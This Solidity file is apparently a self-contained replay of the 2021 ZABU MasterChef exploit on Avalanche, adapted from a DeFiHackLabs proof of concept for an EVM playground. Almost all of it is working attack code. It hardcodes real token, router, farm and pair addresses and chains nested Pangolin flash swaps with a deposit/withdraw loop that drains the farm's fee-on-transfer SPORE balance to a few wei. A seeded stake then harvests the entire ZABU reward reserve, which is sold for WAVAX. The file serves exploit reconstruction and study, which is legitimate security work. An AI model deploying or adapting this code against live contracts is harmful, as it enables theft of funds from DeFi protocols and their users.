// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2021-09-ZABU).
//
// The DeFiHackLabs PoC runs the entire attack INLINE in the Foundry test
// contract `ContractTest`: the two nested Pangolin flash-swap callbacks
// (`pangolinCall`) live on the test itself, and a separate `depositToken`
// helper holds the seeded stake + harvests/sells. There is no single
// standalone exploit contract to deploy. This file is a faithful,
// self-contained copy of that inline attack so the playground can deploy it
// and record `run()`. Logic and constants are copied VERBATIM from
// test/ZABU_exp.sol (ContractTest.testExploit + ContractTest.pangolinCall +
// depositToken.depositSPORE/withdrawSPORE/sellZABU).
//
// Root cause: the ZABU MasterChef farm (pid 38 = SPORE pool) derives its
// per-share reward accumulator `accZABUPerShare` from SPORE's LIVE balanceOf
// the farm, and SPORE is a 6%-fee deflationary token. Repeatedly
// deposit(x)/withdraw(x) bleeds the farm's SPORE balance down to a few wei,
// so `accZABUPerShare += reward*1e12 / ~3` explodes, and a tiny pre-seeded
// legitimate stake then harvests the farm's ENTIRE ZABU reward reserve
// (4,526,636,431 ZABU), which is sold for ~1,089 WAVAX net profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IZABUFarm {
    function deposit(uint256 _pid, uint256 _amount) external;
    function withdraw(uint256 _pid, uint256 _amount) external;
    function userInfo(uint256 _pid, address _user) external view returns (uint256 amount, uint256 rewardDebt);
}

// Mirror of the Foundry test's `depositToken` helper: holds the seeded legit
// SPORE stake, harvests it against the inflated accumulator, and dumps ZABU.
contract ZABUDepositToken {
    IERC20 constant ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
    IERC20 constant WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 constant SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
    IUniswapV2Router constant Router = IUniswapV2Router(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);
    IZABUFarm constant Farm = IZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);

    // test: depositSPORE() — buys SPORE with 1 WAVAX and stakes it (seeds the
    // tiny legitimate position that later harvests against the inflated acc).
    function depositSPORE() external payable {
        address(WAVAX).call{value: 1 ether}("");
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(SPORE);
        WAVAX.approve(address(Router), type(uint256).max);
        SPORE.approve(address(Farm), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WAVAX.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
        Farm.deposit(uint256(38), SPORE.balanceOf(address(this)));
    }

    // test: withdrawSPORE() — harvests the seeded legit stake. The Foundry test
    // withdraws `SPORE.balanceOf(farm)` (== 3 wei after the collapse loop): a
    // token amount just large enough to trigger updatePool + the reward payout.
    // Withdrawing the FULL staked amount would fail (the farm only holds ~3 wei
    // of SPORE now), but the ZABU reward payout is sized by user.amount × the
    // inflated accZABUPerShare, not by the SPORE withdrawn — so withdrawing the
    // residual still drains the farm's whole ZABU balance.
    function withdrawSPORE() external {
        Farm.withdraw(uint256(38), SPORE.balanceOf(address(Farm)));
    }

    // test: sellZABU() — swaps the drained ZABU for WAVAX via the ZABU/WAVAX pair.
    function sellZABU() external {
        address[] memory path = new address[](2);
        path[0] = address(ZABU);
        path[1] = address(WAVAX);
        WAVAX.approve(address(Router), type(uint256).max);
        ZABU.approve(address(Router), type(uint256).max);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ZABU.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    // Forward this helper's entire ZABU balance to `to` so the recorder can
    // score the drained reward on a known address (the exploit contract). Not
    // part of the historical attack — plumbing for the playground recording.
    function sweepZABU(address to) external {
        ZABU.transfer(to, ZABU.balanceOf(address(this)));
    }
}

// Mirror of the Foundry `ContractTest`: owns the flash-swap orchestration +
// the two nested `pangolinCall` callbacks (one per Pangolin pair). `run()` is
// the recorded entrypoint that stands in for `testExploit()`.
contract ZABUDrain {
    IERC20 constant ZABU = IERC20(0xDd453dBD253fA4E5e745047d93667Ce9DA93bbCF);
    IERC20 constant WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 constant SPORE = IERC20(0x6e7f5C0b9f4432716bDd0a77a3601291b9D9e985);
    IERC20 constant PNG = IERC20(0x60781C2586D68229fde47564546784ab3fACA982);
    IUniswapV2Router constant Router = IUniswapV2Router(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);
    IZABUFarm constant Farm = IZABUFarm(0xf61b4f980A1F34B55BBF3b2Ef28213Efcc6248C4);
    IUniswapV2Pair constant PangolinPair1 = IUniswapV2Pair(0x0a63179a8838b5729E79D239940d7e29e40A0116); // SPORE/WAVAX
    IUniswapV2Pair constant PangolinPair2 = IUniswapV2Pair(0xad24a72ffE0466399e6F69b9332022a71408f10b); // SPORE/PNG

    // Profit is measured on the helper's ZABU balance, so keep a handle to it.
    ZABUDepositToken public helper;

    uint256 reserve0Pair1;
    uint256 reserve1Pair1;
    uint256 reserve0Pair2;
    uint256 reserve1Pair2;

    // Unrecorded setup phase — mirrors ContractTest.testExploit()'s first half:
    // wrap 2500 WAVAX (PNG-repayment bankroll), deploy the helper + seed a tiny
    // legit SPORE stake, then flash-borrow bulk SPORE and run the collapse loop
    // to drain the farm's SPORE balance to ~3 wei. Run BEFORE the recorded
    // harvest (the recorder calls it as a setup rawCall) so the reward-block gap
    // is preserved for the harvest's updatePool. `payable` — funded via msg.value.
    function collapse() external payable {
        SPORE.approve(address(Farm), type(uint256).max);
        WAVAX.approve(address(Router), type(uint256).max);
        (reserve0Pair1, reserve1Pair1,) = PangolinPair1.getReserves();
        (reserve0Pair2, reserve1Pair2,) = PangolinPair2.getReserves();
        address(WAVAX).call{value: 2500 ether}("");
        // deploy the helper, seed a tiny legit SPORE stake
        helper = new ZABUDepositToken();
        address(address(helper)).call{value: 1 ether}(abi.encodeWithSignature("depositSPORE()"));

        // borrow ~all SPORE from pair1; pangolinCall nests a pair2 borrow +
        // the collapse loop, then repays both flash-swaps before returning.
        PangolinPair1.swap(SPORE.balanceOf(address(PangolinPair1)) - 1 * 1e18, 0, address(this), new bytes(1));
    }

    // Recorded entrypoint — the harvest. Runs AFTER `collapse()` (setup) has
    // drained the farm's SPORE balance to ~3 wei. The helper withdraws its tiny
    // seeded stake; the farm's updatePool now divides reward*1e12 by ~3 wei and
    // inflates accZABUPerShare astronomically, so `pending` drains the farm's
    // ENTIRE 4.53B ZABU reward reserve into the helper. The drained ZABU is then
    // swept to this contract (so the recorder can score the profit) and dumped.
    function run() external {
        // Step 1 — harvest: the helper withdraws its tiny seeded SPORE stake.
        // updatePool runs first and divides the block reward by the farm's now-
        // ~3-wei SPORE balance, exploding accZABUPerShare; pending then exceeds
        // the farm's entire ZABU reserve and safeZABUTransfer pays it all out.
        address(address(helper)).call(abi.encodeWithSignature("withdrawSPORE()"));

        // Step 2 — sweep the drained ZABU reward to this contract so the
        // recorder can score it as profit on the exploit's balance.
        helper.sweepZABU(address(this));

        // Step 3 — dump: sell the drained ZABU for WAVAX on the ZABU/WAVAX pair
        // (the historical attacker realized ~1,089 WAVAX of net profit).
        address(address(helper)).call(abi.encodeWithSignature("sellZABU()"));
    }

    // test: pangolinCall — the two nested flash-swap callbacks. Copied verbatim
    // from ContractTest.pangolinCall (only msg.sender checks generalized to the
    // two pair constants).
    function pangolinCall(address, uint256 amount0, uint256 amount1, bytes calldata) external {
        if (msg.sender == address(PangolinPair1)) {
            PangolinPair2.swap(0, reserve1Pair2 - 1 * 1e18, address(this), new bytes(1));
            // flashswap callback pair1
            uint256 amountSPORE0 = SPORE.balanceOf(address(this));
            SPORE.transfer(address(PangolinPair1), amountSPORE0);
            uint256 SPOREInPair1 = SPORE.balanceOf(address(PangolinPair1));
            uint256 WAVAXInPair1 = WAVAX.balanceOf(address(PangolinPair1));
            uint256 amountWAVAX = (
                reserve0Pair1 * reserve1Pair1 / ((SPOREInPair1 * 1000 - amountSPORE0 * 3 * 96 / 100) / 1000)
                    - WAVAXInPair1
            ) * 1000 / 997;
            WAVAX.transfer(address(PangolinPair1), amountWAVAX);
        }

        if (msg.sender == address(PangolinPair2)) {
            // collapse the farm's SPORE balance toward 0 (the vulnerability). The
            // historical attack drained it to ~3 wei; we churn deposit/withdraw
            // until the farm's SPORE balance is a tiny nonzero residual, so the
            // later harvest's updatePool divides reward*1e12 by that near-zero
            // lpSupply and inflates accZABUPerShare (updatePool returns early
            // with NO inflation when lpSupply == 0).
            while (SPORE.balanceOf(address(Farm)) > 1000) {
                uint256 amount = SPORE.balanceOf(address(this));
                if (amount == 0) break; // attacker out of churn capital
                if (SPORE.balanceOf(address(this)) * 6 / 100 > SPORE.balanceOf(address(Farm))) {
                    amount = SPORE.balanceOf(address(Farm)) * 100 / 6;
                }
                Farm.deposit(uint256(38), amount);
                Farm.withdraw(uint256(38), amount);
            }

            // flashswap callback pair2
            uint256 amountSPORE1 = SPORE.balanceOf(address(this)) / 3;
            SPORE.transfer(address(PangolinPair2), amountSPORE1);
            uint256 SPOREInPari2 = SPORE.balanceOf(address(PangolinPair2));
            uint256 PNGInPair2 = PNG.balanceOf(address(PangolinPair2));
            uint256 amountPNG = (
                reserve0Pair2 * reserve1Pair2 / ((SPOREInPari2 * 1000 - amountSPORE1 * 3 * 96 / 100) / 1000)
                    - PNGInPair2
            ) * 1000 / 997;
            buyPNG(amountPNG);
            PNG.transfer(address(PangolinPair2), PNG.balanceOf(address(this)));
        }
    }

    // test: buyPNG — buy the exact PNG needed to repay pair2 via the WAVAX/PNG route.
    function buyPNG(uint256 amount) public {
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(PNG);
        Router.swapTokensForExactTokens(amount, WAVAX.balanceOf(address(this)), path, address(this), block.timestamp);
    }

    // sweep helper's balances to this contract (used for profit forwarding)
    receive() external payable {}
}
